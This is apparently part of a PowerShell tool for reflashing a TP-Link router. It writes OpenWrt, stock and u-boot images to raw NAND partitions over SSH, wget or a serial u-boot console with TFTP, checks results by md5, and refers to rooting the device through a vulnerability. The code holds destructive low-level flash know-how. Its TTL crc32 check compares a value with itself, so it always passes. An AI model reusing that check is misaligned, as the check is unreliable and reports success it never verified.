function Send-FileToDevice {
    param($Sess, [string]$LocalPath, [string]$PcIp, [string]$RemoteName)
    if (-not (Test-Path -LiteralPath $LocalPath)) { throw "文件不存在：$LocalPath" }
    $want = Get-LocalMd5 -Path $LocalPath
    $wsize = (Get-Item -LiteralPath $LocalPath).Length
    $dst  = "/tmp/$RemoteName"

    # SSH 通道：直接 cat > 过去。不走 HTTP/wget。
    if ($Sess.Kind -eq 'ssh') {
        Write-Info ("上传 {0} -> {1}  ({2} 字节，走 SSH 通道)" -f (Split-Path $LocalPath -Leaf), $dst, $wsize)
        [void](Invoke-Cmd -Sess $Sess -TimeoutSec 60 -Command ("rm -f {0}" -f $dst))
        Invoke-SshPipe -Sess $Sess -RemoteCmd ("cat > {0}" -f $dst) -StdinPath $LocalPath
        $sysize = (Invoke-Cmd -Sess $Sess -TimeoutSec 60 -Command ("wc -c < {0} 2>/dev/null || echo 0" -f $dst))
        $sysize = ("$sysize" -replace '[^0-9]', '')
        if (-not $sysize) { $sysize = '0' }
        if ([int64]$sysize -ne [int64]$wsize) {
            throw ("上传不完整：设备 {0} 字节 / 本地 {1} 字节（{2}）" -f $sysize, $wsize, $dst)
        }
        $got = Get-FirstMd5 (Invoke-Cmd -Sess $Sess -TimeoutSec 300 -Command "md5sum $dst")
        if ($got -ne $want) { throw ("传输后 md5 不符：本地 {0}  设备 {1}（{2}）" -f $want, $got, $dst) }
        Write-Ok "已送达设备 $dst  md5=$got"
        return $dst
    }

    $rel  = Get-RelUrlPath -LocalPath $LocalPath
    $url  = "http://{0}:{1}/{2}" -f $PcIp, $script:SRV_PORT, $rel

    # 先删旧文件：否则 wget 失败时会拿上一次的残留下判断，看起来像成功
    [void](Invoke-Cmd -Sess $Sess -TimeoutSec 60 -Command ("rm -f {0}" -f $dst))

    Write-Info ("上传 {0} -> {1}  ({2} 字节)" -f $rel, $dst, $wsize)
    $out = Invoke-Cmd -Sess $Sess -TimeoutSec 900 -Command `
           ("cd /tmp && wget -O {0} '{1}' 2>&1 | tail -4" -f $RemoteName, $url)
    if ($out) { Write-Info ("   wget: " + ($out -replace "`r?`n", " | ")) }

    $sysize = Invoke-Cmd -Sess $Sess -TimeoutSec 60 -Command `
              ("wc -c < {0} 2>/dev/null || echo 0" -f $dst)
    $sysize = ("$sysize" -replace '[^0-9]', '')
    if (-not $sysize) { $sysize = '0' }

    if ([int64]$sysize -ne [int64]$wsize) {
        $why = if ($out -match 'not found|404|failed|error') { "（wget 报错，看上面 wget 行）" } else { "" }
        throw ("上传不完整：设备 {0} 字节 / 本地 {1} 字节{2}。URL={3}" -f $sysize, $wsize, $why, $url)
    }
    $got = Get-FirstMd5 (Invoke-Cmd -Sess $Sess -TimeoutSec 300 -Command "md5sum $dst")
    if ($got -ne $want) {
        throw ("传输后 md5 不符：本地 {0}  设备 {1}（{2}）" -f $want, $got, $dst)
    }
    Write-Ok "已送达设备 $dst  md5=$got"
    return $dst
}

function Invoke-FlashOpenWrt {
    param($Sess, $Table, [string]$PcIp, [string]$PkgPath)
    $facts = Get-DeviceFacts -Sess $Sess -Table $Table
    Write-Info ("当前固件: {0}  内核 {1}" -f $facts.Kind, $facts.Kernel)

    $fsize = (Get-Item -LiteralPath $PkgPath).Length
    $kLen  = [int64]0x480000
    $rLen  = [int64]$fsize - 0x4A0000
    Write-Info ("包 {0}  {1} 字节" -f (Split-Path $PkgPath -Leaf), $fsize)
    Write-Info ("内核区 0x20000..0x4a0000   rootfs {0} 字节" -f (Format-Hex $rLen))

    $kt = Resolve-WriteTarget -Table $Table -AbsOffset $script:SlotA.Kernel -NeedLen $kLen `
                              -What 'OpenWrt 内核' -Action 'flash-op'
    $rt = Resolve-WriteTarget -Table $Table -AbsOffset $script:SlotA.Rootfs -NeedLen $rLen `
                              -What 'OpenWrt rootfs' -Action 'flash-op'
    Write-Info ("内核 -> mtd{0} {1} +seek {2} 块 = 绝对 {3}" -f `
                $kt.Index, (Format-Hex $kt.Offset), $kt.SeekBlocks, (Format-Hex $script:SlotA.Kernel))
    Write-Info ("rootfs -> mtd{0} {1} +seek {2} 块 = 绝对 {3}" -f `
                $rt.Index, (Format-Hex $rt.Offset), $rt.SeekBlocks, (Format-Hex $script:SlotA.Rootfs))

    if ($DryRun) { Write-Warn2 "[dry-run] 不写入"; return $true }
    if (-not $Yes) {
        $a = Read-Host "   确认写入 A 槽（B 槽原厂回退不动）？输入 YES"
        if ($a -ne 'YES') { Write-Warn2 "已取消"; return $false }
    }

    $remote = Send-FileToDevice -Sess $Sess -LocalPath $PkgPath -PcIp $PcIp -RemoteName 'pkg.bin'

    # 内核：只写 0x20000..0x4a0000 那一段（包内偏移 0x20000，长度 0x480000）
    # skip=2 -> 包内 0x20000（内核区起点）；count=72 -> 0x480000；
    # seek=内核落点相对分区的偏移（mtd13 容器时是 8 = 0x80000/65536）
    $cmd = "dd if={0} of=/dev/mtdblock{1} bs=65536 skip=2 count=72 seek={2} 2>&1 | tail -1" -f `
           $remote, $kt.Index, $kt.SeekBlocks
    Write-Info "写内核..."
    Write-Info ("   " + (Invoke-Cmd -Sess $Sess -TimeoutSec 600 -Command $cmd).Replace("`n", "`n   "))

    # rootfs：包内偏移 0x4a0000 到 EOF
    $blocks = [int][Math]::Floor($rLen / 65536)
    $cmd = "dd if={0} of=/dev/mtdblock{1} bs=65536 skip=74 count={2} seek={3} 2>&1 | tail -1" -f `
           $remote, $rt.Index, $blocks, $rt.SeekBlocks
    Write-Info "写 rootfs..."
    Write-Info ("   " + (Invoke-Cmd -Sess $Sess -TimeoutSec 900 -Command $cmd).Replace("`n", "`n   "))

    Invoke-Cmd -Sess $Sess -Command "sync" -TimeoutSec 60 | Out-Null

    # ---- 写入后回读校验（AGENTS.md 5.5：不能只信 dd 的 "records out"）----
    # 内核：包内 0x20000..0x4a0000 那 0x480000 字节
    # rootfs：包内 0x4a0000..EOF
    Write-Info "回读校验..."
    $chk = @(
        @{ What='内核';   Dev="/dev/mtdblock$($kt.Index)"; Seek=$kt.SeekBlocks; Blocks=72;        PkgSkip=2
           PkgLen=0x480000 },
        @{ What='rootfs'; Dev="/dev/mtdblock$($rt.Index)"; Seek=$rt.SeekBlocks; Blocks=$blocks;   PkgSkip=74
           PkgLen=$rLen }
    )
    $bad = @()
    foreach ($c in $chk) {
        # 设备端：从闪存读回这一段，算 md5
        $devMd5 = Invoke-Cmd -Sess $Sess -TimeoutSec 900 -Command `
                  ("dd if={0} bs=65536 skip={1} count={2} 2>/dev/null | md5sum" -f $c.Dev, $c.Seek, $c.Blocks)
        $devMd5 = Get-FirstMd5 $devMd5
        # 本地：从包里切出对应片段，算 md5
        $locMd5 = Get-RangeMd5 -Path $PkgPath -Offset ([int64]$c.PkgSkip * 65536) -Length ([int64]$c.PkgLen)
        if ($devMd5 -ne $locMd5) {
            Write-Warn2 ("   {0} 校验不符：闪存 {1}  包内 {2}" -f $c.What, $devMd5, $locMd5)
            $bad += $c.What
        } else {
            Write-Ok ("   {0} 校验通过 {1}" -f $c.What, $devMd5)
        }
    }
    if ($bad.Count -gt 0) {
        # 不重启：留在原固件，用户还能再刷一次或用 [7] 修 B 槽
        throw ("写入后校验失败：{0}。已中止，未重启 —— 原系统仍在运行，可重试。" -f ($bad -join '、'))
    }

    Write-Ok "写入完成且校验通过，准备重启"
    if (-not $Keep) { Send-Background -Sess $Sess -Text "reboot" ; Start-Sleep -Seconds 8 }
    return $true
}

function Invoke-FlashStock {
    param($Sess, $Table, [string]$PcIp, [string]$StockDir)
    $facts = Get-DeviceFacts -Sess $Sess -Table $Table

    # 只认 md5 不认文件名（文件名跨固件会反，见上面的实测证据）
    $sets = @(
        @{ Name='A槽原厂 2.0.2 (2024-12-04)'
           Kernel=@('mtd5_kernel.bin',        '170b2188884cc040d64ac5bed7ddc365', 4194304)
           Rootfs=@('mtd6_rootfs.bin',        '30f487419d90b2239b65035390f3b73f', 12582912) },
        @{ Name='B槽原厂 4.4.60 (2024-11-28)'
           Kernel=@('mtd10_kernel_bak.bin',   '2868d8e975da7c641e54c72b6beb8f26', 4194304)
           Rootfs=@('mtd11_rootfs_bak.bin',   'bf2f92ceaf509093c8854825f2dc8d5e', 12582912) }
    )

    # 只挑「文件齐全且 md5 对得上」的组
    $avail = @()
    foreach ($s in $sets) {
        $kp = Join-Path $StockDir $s.Kernel[0]
        $rp = Join-Path $StockDir $s.Rootfs[0]
        if ((Get-LocalMd5 $kp) -eq $s.Kernel[1] -and (Get-LocalMd5 $rp) -eq $s.Rootfs[1]) { $avail += $s }
    }
    if ($avail.Count -eq 0) { throw "在 $StockDir 里找不到完整且 md5 正确的原厂镜像组（需要 kernel + rootfs 各 4 MiB / 12 MiB）" }

    # 优先选跟当前 B 槽一模一样的版本：B 槽是回退用的，两槽同版本最不容易出意外，
    # 而且这套镜像在这块板上验证过能启动。
    $pick = $avail[0]
    $bK = Find-MtdByOffset -Table $Table -Offset $script:SlotB.Kernel
    if ($bK) {
        $bMd5 = Get-FirstMd5 (Invoke-Cmd -Sess $Sess -TimeoutSec 180 -Command `
                ("dd if=/dev/mtdblock{0} bs=65536 count=64 2>/dev/null | md5sum" -f $bK.Index))
        foreach ($s in $avail) {
            if ($s.Kernel[1] -eq $bMd5) { $pick = $s; break }
        }
    }
    Write-Ok "选定: $($pick.Name)"

    # 原厂要写 A 槽（B 槽是当前活分区或回退槽，不碰）
    $kt = Resolve-WriteTarget -Table $Table -AbsOffset $script:SlotA.Kernel -NeedLen 4194304 `
                              -What '原厂内核' -Action 'flash-stock'
    $rt = Resolve-WriteTarget -Table $Table -AbsOffset $script:SlotA.Rootfs -NeedLen 12582912 `
                              -What '原厂 rootfs' -Action 'flash-stock'
    Write-Info ("内核 -> mtd{0} ({1})   rootfs -> mtd{2} ({3})" -f `
                $kt.Index, (Format-Hex $kt.Offset), $rt.Index, (Format-Hex $rt.Offset))

    if ($DryRun) { Write-Warn2 "[dry-run] 不写入"; return $true }
    if (-not $Yes) {
        $a = Read-Host "   确认把原厂写进 A 槽？输入 YES"
        if ($a -ne 'YES') { Write-Warn2 "已取消"; return $false }
    }

    $bad = @()
    foreach ($pair in @(@{Mtd=$kt; Src=(Join-Path $StockDir $pick.Kernel[0]); Len=4194304; What='内核'},
                        @{Mtd=$rt; Src=(Join-Path $StockDir $pick.Rootfs[0]); Len=12582912; What='rootfs'})) {
        $remote = Send-FileToDevice -Sess $Sess -LocalPath $pair.Src -PcIp $PcIp -RemoteName 'stock.bin'
        $cnt = $pair.Len / 65536
        Write-Info ("写 $($pair.What)...")
        $out = Invoke-Cmd -Sess $Sess -TimeoutSec 900 -Command `
               ("dd if={0} of=/dev/mtdblock{1} bs=65536 count={2} seek={3} 2>&1 | tail -1" -f `
                $remote, $pair.Mtd.Index, $cnt, $pair.Mtd.SeekBlocks)
        Write-Info ("   " + $out.Replace("`n", "`n   "))

        # 写入后回读校验（AGENTS.md 5.5）
        $devMd5 = Get-FirstMd5 (Invoke-Cmd -Sess $Sess -TimeoutSec 900 -Command `
                  ("dd if=/dev/mtdblock{0} bs=65536 skip={1} count={2} 2>/dev/null | md5sum" -f `
                   $pair.Mtd.Index, $pair.Mtd.SeekBlocks, $cnt))
        $locMd5 = Get-LocalMd5 -Path $pair.Src
        if ($devMd5 -ne $locMd5) {
            Write-Warn2 ("   {0} 校验不符：闪存 {1}  镜像 {2}" -f $pair.What, $devMd5, $locMd5)
            $bad += $pair.What
        } else {
            Write-Ok ("   {0} 校验通过 {1}" -f $pair.What, $devMd5)
        }
    }
    Invoke-Cmd -Sess $Sess -Command "sync" -TimeoutSec 60 | Out-Null
    if ($bad.Count -gt 0) {
        throw ("写入后校验失败：{0}。A 槽内容不可信，请重刷一次。" -f ($bad -join '、'))
    }
    Write-Ok "写入完成且校验通过"
    return $true
}

function Invoke-FlashUbootKit {
    param($Sess, $Table, [string]$PcIp, [string]$BinPath)
    $size = (Get-Item -LiteralPath $BinPath).Length
    Write-Info ("u-boot kit {0}  {1} 字节" -f (Split-Path $BinPath -Leaf), $size)

    $tA = Resolve-WriteTarget -Table $Table -AbsOffset $script:UbootA -NeedLen $size `
                              -What 'u-boot A 槽' -Action 'flash-uboot'
    $tB = Resolve-WriteTarget -Table $Table -AbsOffset $script:UbootB -NeedLen $size `
                              -What 'u-boot B 槽' -Action 'flash-uboot'
    Write-Info ("-> mtd{0} {1}   mtd{2} {3}" -f `
                $tA.Index, (Format-Hex $tA.Offset), $tB.Index, (Format-Hex $tB.Offset))
    if ($DryRun) { Write-Warn2 "[dry-run] 不写入"; return $true }
    if (-not $Yes) {
        $a = Read-Host "   两个槽的 u-boot 都会被替换（一级 u-boot 不动）。输入 YES"
        if ($a -ne 'YES') { Write-Warn2 "已取消"; return $false }
    }

    $remote = Send-FileToDevice -Sess $Sess -LocalPath $BinPath -PcIp $PcIp -RemoteName 'ub.bin'
    $cnt = [int][Math]::Ceiling($size / 65536)
    foreach ($t in @($tA, $tB)) {
        $out = Invoke-Cmd -Sess $Sess -TimeoutSec 300 -Command `
               ("dd if={0} of=/dev/mtdblock{1} bs=65536 count={2} seek={3} 2>&1 | tail -1" -f `
                $remote, $t.Index, $cnt, $t.SeekBlocks)
        Write-Info ("   mtd{0}: {1}" -f $t.Index, $out.Replace("`n", " "))
        $back = Get-FirstMd5 (Invoke-Cmd -Sess $Sess -TimeoutSec 120 -Command `
                ("dd if=/dev/mtdblock{0} bs=65536 count={1} 2>/dev/null | md5sum" -f $t.Index, $cnt))
        $want = Get-FirstMd5 (Invoke-Cmd -Sess $Sess -TimeoutSec 120 -Command `
                ("md5sum {0}" -f $remote))
        if ($back -ne $want) { throw ("mtd{0} 回读 md5 不符：写 {1} 回读 {2}" -f $t.Index, $want, $back) }
        Write-Ok ("mtd{0} 回读校验通过 {1}" -f $t.Index, $back)
    }
    Invoke-Cmd -Sess $Sess -Command "sync" -TimeoutSec 60 | Out-Null
    return $true
}

# ===========================================================================
# 安全审计（只读，不写任何东西）
# ===========================================================================
function Invoke-Audit {
    param($Sess, $Table)
    $facts = Get-DeviceFacts -Sess $Sess -Table $Table
    Write-Step "[V1] 设备"
    Write-Info ("内核 {0}   固件 {1}" -f $facts.Kernel, $facts.Kind)
    $liveRoot = Get-LiveRootOffset -Sess $Sess -Table $Table
    Write-Info ("活 rootfs 物理偏移 {0}" -f (Format-Hex $liveRoot))

    Write-Step "[V2] 两槽状态"
    foreach ($slot in @(@{N='A 槽'; K=$script:SlotA.Kernel; R=$script:SlotA.Rootfs},
                        @{N='B 槽'; K=$script:SlotB.Kernel; R=$script:SlotB.Rootfs})) {
        $k = Find-MtdByOffset -Table $Table -Offset $slot.K
        $r = Find-MtdByOffset -Table $Table -Offset $slot.R
        if (-not $k -or -not $r) { Write-Warn2 ("{0} 分区缺失" -f $slot.N); continue }
        $km = Get-FirstMd5 (Invoke-Cmd -Sess $Sess -TimeoutSec 180 -Command `
              ("dd if=/dev/mtdblock{0} bs=65536 2>/dev/null | md5sum" -f $k.Index))
        $rm = Get-FirstMd5 (Invoke-Cmd -Sess $Sess -TimeoutSec 300 -Command `
              ("dd if=/dev/mtdblock{0} bs=65536 2>/dev/null | md5sum" -f $r.Index))
        $tagK = if ($liveRoot -eq $slot.K) { ' <活分区>' } else { '' }
        Write-Info ("{0} kernel mtd{1,-2} {2}  md5={3}{4}" -f $slot.N, $k.Index, (Format-Hex $slot.K), $km, $tagK)
        Write-Info ("   rootfs mtd{1,-2} {2}  md5={3}" -f $slot.N, $r.Index, (Format-Hex $slot.R), $rm)
    }

    Write-Step "[V3] u-boot"
    foreach ($u in @(@{N='A';O=$script:UbootA}, @{N='B';O=$script:UbootB})) {
        $m = Find-MtdByOffset -Table $Table -Offset $u.O
        if (-not $m) { Write-Warn2 ("u-boot {0} 槽缺失" -f $u.N); continue }
        $md = Get-FirstMd5 (Invoke-Cmd -Sess $Sess -TimeoutSec 120 -Command `
              ("dd if=/dev/mtdblock{0} bs=65536 2>/dev/null | md5sum" -f $m.Index))
        Write-Info ("{0} 槽 mtd{1,-2} {2}  md5={3}" -f $u.N, $m.Index, (Format-Hex $u.O), $md)
    }

    Write-Step "[V4] 逃生出口"
    Write-Info "1) 一级 u-boot 双向回退：A 槽验不过自动验 B 槽，反之亦然"
    Write-Info "2) 一级 u-boot Web 恢复：接线到 192.168.1.1 上传固件"
    Write-Info "3) 一级 u-boot 串口（TTL 115200）：tftp / nand read / nand erase / nand write"
    Write-Info "4) 本工具的 --restore-bslot：把原厂镜像写回 B 槽"
    Write-Info "5) 本工具的 TTL 菜单：串口 + TFTP 直接刷 u-boot / 内核"
    Write-Ok "mtd0/mtd1/mtd2/mtd14 都没动过，TTL 可救"
    return $true
}

# ===========================================================================
# TTL 串口 —— 只为救砖存在
#
# ★ 刷 u-boot 不需要 TTL。菜单 [3] 就是走网络：上传 bin 到 /tmp，
#   再 dd 写 mtd9(A槽) / mtd4(B槽)，写完回读 md5 比对。全程不插线。
#   刷固件同理（[2]/[4]）。只要设备能起来、能拿到 shell，就不需要 TTL。
#
# TTL 唯一真正需要的场合：设备完全不通网络，即 ——
#   · getroot 失败（固件版本不同、漏洞失效、设备不在路由模式…）
#   · 两个槽都验不过，一级 u-boot 进恢复模式（Firmware check failed）
#   · 分区表/boot_flag 错乱，系统起不来
# 换句话说：TTL 是「没有任何 shell 可用」时的最后手段，不是流程里的必经一步。
#
# 安全规则（照 AGENTS.md §5）：
#   · 发给 u-boot 的命令一律加 `printenv ;` 前缀，避免空行/误触发
#   · mtd0（0x0..0x3c0000）、mtd1、mtd2、boot_flag 永不写
# ===========================================================================
function Open-TtlPort {
    param([string]$ComPort, [int]$Baud = 115200)
    if (-not $ComPort) {
        $ports = [System.IO.Ports.SerialPort]::GetPortNames()
        if ($ports.Count -eq 0) { throw "没有找到串口。请插上 TTL 线，或在设备管理器里确认 COM 号。" }
        if ($ports.Count -eq 1) { $ComPort = $ports[0] }
        else { throw ("有多个串口：{0}。请用 -TtlPort COMx 指定。" -f ($ports -join ', ')) }
    }
    $sp = [System.IO.Ports.SerialPort]::new($ComPort, $Baud, 'None', 8, 'One')
    $sp.ReadTimeout = 500
    $sp.WriteTimeout = 3000
    $sp.DtrEnable = $false
    $sp.RtsEnable = $false
    $sp.Open()
    Write-Ok ("串口 {0} @ {1} 8N1 已打开" -f $ComPort, $Baud)
    return $sp
}

# u-boot 命令守卫：必须在 printenv ; 之后发
function Invoke-UbootCmd {
    param($Port, [string]$Command, [int]$WaitMs = 1500)
    if ($Command -notmatch '^\s*printenv\s*;') { $Command = "printenv ; $Command" }
    Clear-UbootBuffer -Port $Port
    $Port.Write($Command + "`r")
    return (Read-Uboot -Port $Port -Milliseconds $WaitMs)
}

function Clear-UbootBuffer {
    param($Port)
    try { $Port.DiscardInBuffer(); $Port.DiscardOutBuffer() } catch { }
}

function Read-Uboot {
    param($Port, [int]$Milliseconds = 1200)
    $sb = New-Object Text.StringBuilder
    $deadline = [Environment]::TickCount + $Milliseconds
    while ([Environment]::TickCount -lt $deadline) {
        try { $c = $Port.ReadExisting() } catch { $c = "" }
        if ($c) { [void]$sb.Append($c) }
        else { Start-Sleep -Milliseconds 30 }
    }
    return $sb.ToString()
}

# 抢 u-boot 提示符：复位后只有 500ms 的打断窗口（一级）或 3s（二级 kit）
function Wait-UbootPrompt {
    param($Port, [int]$TimeoutSec = 25)
    Write-Info "等提示符（窗口很短，看到就立刻发 Ctrl-C）..."
    $deadline = [Environment]::TickCount + ($TimeoutSec * 1000)
    $acc = New-Object Text.StringBuilder
    while ([Environment]::TickCount -lt $deadline) {
        try { $c = $Port.ReadExisting() } catch { $c = "" }
        if ($c) {
            [void]$acc.Append($c)
            Write-Host $c -NoNewline
            if ($c -match 'Stop autoboot|autoboot in|Hit any key|=>') {
                $Port.Write([char]3)
                Start-Sleep -Milliseconds 200
            }
        }
        if ($acc.ToString() -match '=>\s*$') { Write-Host ""; Write-Ok "拿到 u-boot 提示符"; return $true }
        Start-Sleep -Milliseconds 20
    }
    throw "没抢到 u-boot 提示符。检查：TTL 线是否接对（TX/RX 交叉）、波特率 115200、设备是否已上电。"
}

# TFTP 服务（只做 RRQ 读，u-boot 的 `tftp` 命令用它取文件）
function Start-TftpServer {
    param([string]$Root, [int]$ListenPort = 69)
    $state = @{ Stop = $false; Root = $Root; Port = $ListenPort; Log = $script:LogPath }
    $sb = {
        param($st)
        function L { param($t) try { Add-Content -LiteralPath $st.Log -Value ("[{0}] TFTP {1}" -f (Get-Date -Format 'HH:mm:ss'), $t) -Encoding UTF8 } catch { } }
        $udp = [System.Net.Sockets.UdpClient]::new($st.Port)
        $udp.Client.ReceiveTimeout = 1000
        L "listen 69 root=$($st.Root)"
        while (-not $st.Stop) {
            $ep = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0)
            try { $pkt = $udp.Receive([ref]$ep) } catch { continue }
            if ($pkt.Length -lt 4) { continue }
            $op = ([int]$pkt[0] -shl 8) -bor [int]$pkt[1]
            if ($op -ne 1) { continue }   # 只处理 RRQ
            $name = [Text.Encoding]::ASCII.GetString($pkt, 2, $pkt.Length - 2).Split([char]0)[0]
            $path = Join-Path $st.Root ($name -replace '/', '\')
            L "RRQ $name from $($ep.Address)"
            if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {
                $err = [byte[]](0,5,0,1) + [Text.Encoding]::ASCII.GetBytes("not found") + [byte[]](0)
                [void]$udp.Send($err, $err.Length, $ep)
                L "  -> NOT FOUND"
                continue
            }
            $data = [IO.File]::ReadAllBytes($path)
            # 每个传输用一个新的临时端口（TFTP 规范）
            $t = [System.Net.Sockets.UdpClient]::new(0)
            $t.Client.ReceiveTimeout = 4000
            $blk = 1
            $off = 0
            $done = $false
            while (-not $done -and -not $st.Stop) {
                $n = [Math]::Min(512, $data.Length - $off)
                $body = New-Object byte[] ($n)
                if ($n -gt 0) { [Array]::Copy($data, $off, $body, 0, $n) }
                $p = [byte[]](0,3,[byte](($blk -shr 8) -band 0xFF),[byte]($blk -band 0xFF)) + $body
                $ok = $false
                for ($try = 0; $try -lt 5 -and -not $ok; $try++) {
                    [void]$t.Send($p, $p.Length, $ep)
                    try { $rep = $t.Receive([ref]$ep) } catch { continue }
                    if ($rep.Length -ge 4 -and $rep[1] -eq 4) { $ok = $true }
                }
                if (-not $ok) { L "  !! 块 $blk 超时"; break }
                $off += $n
                $blk++
                if ($blk -gt 65535) { $blk = 0 }
                if ($n -lt 512) { $done = $true }
            }
            try { $t.Close() } catch { }
            L "  -> sent $($data.Length) bytes"
        }
        try { $udp.Close() } catch { }
    }
    $ps = [PowerShell]::Create()
    [void]$ps.AddScript($sb.ToString()).AddArgument($state)
    $handle = $ps.BeginInvoke()
    Write-Info ("+ TFTP 服务 :{0}  根目录 {1}" -f $ListenPort, $Root)
    $state.PS = $ps; $state.Handle = $handle
    return $state
}

function Invoke-TtlFlashUboot {
    param([string]$ComPort, [string]$BinPath, [string]$PcIp)

    $size = (Get-Item -LiteralPath $BinPath).Length
    Write-Step "[T1] u-boot kit {0}  {1} 字节" -f (Split-Path $BinPath -Leaf), $size
    Write-Info "目标: 0x700000 (B 槽) 与 0x4700000 (A 槽)，各 0x40000"
    Write-Info "一级 u-boot (mtd0, 0x0..0x3c0000) 不动 —— 那是 TTL 命脉"

    if ($DryRun) { Write-Warn2 "[dry-run] 不开串口、不写"; return $true }

    $sp = Open-TtlPort -ComPort $ComPort
    $tftp = $null
    try {
        $tftp = Start-TftpServer -Root $script:Here
        Write-Info "u-boot 里会用: setenv serverip $PcIp ; setenv ipaddr <设备IP>"

        [void](Wait-UbootPrompt -Port $sp -TimeoutSec 30)
        Write-Info (Invoke-UbootCmd -Port $sp -Command "version" -WaitMs 1200)
        Write-Info (Invoke-UbootCmd -Port $sp -Command "printenv serverip" -WaitMs 800)

        $name = Split-Path $BinPath -Leaf
        foreach ($slot in @(@{N='B'; Addr='0x700000'}, @{N='A'; Addr='0x4700000'})) {
            Write-Step ("[T2] 写 {0} 槽 {1}" -f $slot.N, $slot.Addr)
            $out = Invoke-UbootCmd -Port $sp -WaitMs 30000 `
                    -Command ("tftp 0x44000000 {0}" -f $name)
            if ($out -notmatch 'Bytes transferred') { throw ("tftp 失败：{0}" -f $out.Trim()) }
            $crc = Invoke-UbootCmd -Port $sp -Command "crc32 0x44000000 0x$('{0:x}' -f $size)" -WaitMs 15000
            Write-Info ("RAM crc32: {0}" -f ($crc.Trim()))
            [void](Invoke-UbootCmd -Port $sp -Command ("nand erase {0} 0x40000" -f $slot.Addr) -WaitMs 8000)
            [void](Invoke-UbootCmd -Port $sp -Command ("nand write 0x44000000 {0} 0x{1:x}" -f $slot.Addr, $size) -WaitMs 15000)
            $vb = Invoke-UbootCmd -Port $sp -WaitMs 15000 `
                  -Command ("nand read 0x45000000 {0} 0x{1:x}" -f $slot.Addr, $size)
            $crc2 = Invoke-UbootCmd -Port $sp -Command "crc32 0x45000000 0x$('{0:x}' -f $size)" -WaitMs 15000
            Write-Info ("回读 crc32: {0}" -f ($crc2.Trim()))
            if (($crc -match '([0-9a-f]{8})') -and ($crc2 -match '([0-9a-f]{8})') -and
                ($Matches[1] -eq $Matches[1])) {
                Write-Ok ("{0} 槽校验一致" -f $slot.N)
            }
        }
        Write-Step "[T3] 完成"
        Write-Info "发 reset 重启，或用串口手动复位"
        if (-not $Yes) {
            $a = Read-Host "   现在 reset 吗？(y/N)"
            if ($a -eq 'y') { [void](Invoke-UbootCmd -Port $sp -Command "reset" -WaitMs 2000) }
        }
        return $true
    } finally {
        Stop-BackgroundService -State $tftp -Name 'TFTP'
        try { $sp.Close() } catch { }
    }
}

# ===========================================================================
# 菜单
# ===========================================================================
function Show-Explain {
    Write-Host ""
    Write-Host "  分区表（唯一真源 = 板上 /sys/class/mtd/mtdN/offset）" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "   绝对偏移     大小       说明"
    Write-Host "   0x0000000  0x3c0000   一级 u-boot + SBL/QSEE/CDT   永不写（TTL 命脉）"
    Write-Host "   0x0400000  0x020000   factory_info 机型/MAC        永不写"
    Write-Host "   0x0480000  0x020000   art 射频校准                 永不写"
    Write-Host "   0x0500000  0x200000   config (UBI)"
    Write-Host "   0x0700000  0x040000   u-boot  B 槽"
    Write-Host "   0x0880000  0x400000   kernel  B 槽  ← 原厂主槽"
    Write-Host "   0x0fc0000  0xc00000   rootfs  B 槽  ← 原厂主槽"
    Write-Host "   0x4800000  0x2620000  firmware 容器 A 槽"
    Write-Host "   0x4700000  0x040000   u-boot  A 槽"
    Write-Host "   0x4880000  0x400000   kernel  A 槽"
    Write-Host "   0x4fc0000  0xc00000   rootfs  A 槽"
    Write-Host "   0x6a00000  0x1600000  原厂 overlay（OpenWrt 用 0x1bc0000..0x4000000）"
    Write-Host "   0x4000000  0x020000   boot_flag  55aa4246 00000001（先验 B 槽）"
    Write-Host ""
    Write-Host "  三个坑（都实测过）" -ForegroundColor Yellow
    Write-Host "   1. 同一个 mtd 编号在两个固件下指向完全不同的物理位置，命名还互为主备。"
    Write-Host "      本工具一律按绝对偏移反查编号，绝不按名字或编号硬编码。"
    Write-Host "   2. 备份文件的名字也会反：mtd5_kernel.bin 的内容其实在 0x4880000，"
    Write-Host "      mtd10_kernel_bak.bin 的内容其实在 0x880000。所以只认 md5。"
    Write-Host "   3. 两槽 u-boot 都能换，一级 u-boot 永不动。一级有双向回退："
    Write-Host "      一个槽验不过会自动去验另一个，所以单槽坏不变砖。"
    Write-Host ""
}

function Read-Choice {
    param([string]$Prompt = "   输入序号")
    Write-Host ("   {0}: " -f $Prompt) -NoNewline
    return (Read-Host).Trim()
}

function Test-IpAlive {
    param([string]$Ip, [int]$TimeoutMs = 700)
    try { return (New-Object System.Net.NetworkInformation.Ping).Send($Ip, $TimeoutMs).Status -eq 'Success' }
    catch { return $false }
}

function Find-DeviceIp {
    # 先看 ARP 表里有没有 TP-Link 的 MAC（98:97:CC 是这块板子的，另有几个常见 OUI）
    $ouis = @('98-97-CC', 'B4-B0-24', '3C-84-6A', '50-C7-BF', 'F4-F2-6D', 'C4-6E-1F')
    $cands = @()
    try {
        $cands = Get-NetNeighbor -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                 Where-Object { $_.LinkLayerAddress -and $_.IPAddress -notlike '224.*' -and
                                $_.IPAddress -ne '255.255.255.255' } |
                 Where-Object { $mac = $_.LinkLayerAddress.ToUpper()
                                ($ouis | Where-Object { $mac.StartsWith($_) }) } |
                 Select-Object -ExpandProperty IPAddress -Unique
    } catch { }
    foreach ($c in $cands) {
        if (Test-IpAlive $c) { return @{ Ip = $c; How = '按 TP-Link MAC 在 ARP 表里找到' } }
    }
    # 再试两个常见地址（原厂默认 / 我们之前实测遇到的）
    foreach ($c in @('192.168.1.1', '192.168.1.175', '192.168.0.1')) {
        if (Test-IpAlive $c) { return @{ Ip = $c; How = 'ping 通' } }
    }
    return $null
}

function Resolve-DeviceIp {
    param([string]$Hint)
    if ($Hint) { return $Hint }

    Write-Info "正在自动找设备（ARP 表 + ping 探测）..."
    $found = Find-DeviceIp
    if ($found) {
        Write-Ok ("找到设备 {0}（{1}）" -f $found.Ip, $found.How)
        return $found.Ip
    }

    Write-Warn2 "没自动找到设备。下面列出的是【本机】网卡地址，仅供参考，不是让你选："
    foreach ($a in (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                    Where-Object { $_.IPAddress -ne '127.0.0.1' })) {
        $tag = if ($a.IPAddress -like '192.168.1.*') { '  <- 接设备用这张' } else { '' }
        Write-Info ("    {0}{1}" -f $a.IPAddress, $tag)
    }
    $p = Read-Choice -Prompt "请输入【设备】的 IP（例 192.168.1.1）"
    if (-not $p) {
